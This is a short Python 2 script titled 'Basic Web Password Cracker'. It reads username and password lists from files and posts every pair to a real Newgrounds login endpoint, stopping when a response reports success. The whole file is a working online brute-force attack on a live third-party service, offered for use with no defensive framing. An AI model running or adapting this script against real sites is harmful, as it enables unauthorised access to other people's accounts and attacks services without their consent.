
# Basic Web Password Cracker
# Wayne Kenney / github.com/LogicPy

import requests
from time import sleep
import sys

# Global Variables
url = "https://www.newgrounds.com/passport/mode/iframe/appsession/7df01f8afbcb51e3648973c934c5fd324e2fc904b5b7f8"
userList = open('users.txt', 'r').read().split('\n')
pwList = open('pw.txt', 'r').read().split('\n')

# Login Function
def login(username,password):

	form_data = {
		'username': username,
		'password': password,
		'remember':'1',
		'login':'1'
	}

	header_data = { }

	r = requests.post(url,data=form_data,headers=header_data)

	check = r.text.encode("utf-8").find("You have successfully")

	return check

# Successful Authentication
def cracked(username, password):
	"\n password cracked (%s:%s) \n" % (username, password)
	x = raw_input("\n Press ENTER to exit \n")
	sys.exit()

# Main Function
def main():
	global url
	global userList
	global pwList

	print "\n Cracker Activated \n"

	for user in userList:
		for pw in pwList:
			print " %s:%s" % (user,pw)
			out = login(user,pw)
			if out == -1:
				pass
			else:
				cracked(user,pw)

# Call Main - Begin Cracking
main()